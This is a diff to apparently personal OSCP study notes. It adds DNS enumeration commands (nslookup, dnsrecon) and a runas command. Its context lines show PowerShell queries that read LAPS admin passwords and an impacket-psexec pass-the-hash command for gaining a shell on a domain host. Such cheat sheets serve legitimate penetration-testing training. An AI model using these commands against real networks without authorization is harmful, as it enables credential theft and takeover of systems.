@@ -1,6 +1,15 @@
 # OSCP
 
-
+DNS:-
+	How to get the hostname of a server using nslookup
+	Steps:-
+		nslookup 
+		server 10.10.10.10
+		127.0.0.1
+		10.10.10.10
+	scan the entire subnet
+	steps:-
+		dnsrecon -d 10.10.10.10 -r 10.0.0.0/8 //des & range
 File Management:-
 
 	Linux:-
@@ -50,6 +59,7 @@ General Information:-
 			invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
 			invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime}
 	
+	runas /netonly /user:domain.g\yazan cmd // to open a cmd with yazan user from active directory
 
 	
 Active Directory Attacks:-
@@ -168,4 +178,5 @@ Active Directory Attacks:-
 	Gaining shell:-
 	
 		impacket-psexec.py domain.local/administrator@10.10.10.10 -H hash 
+	
 	
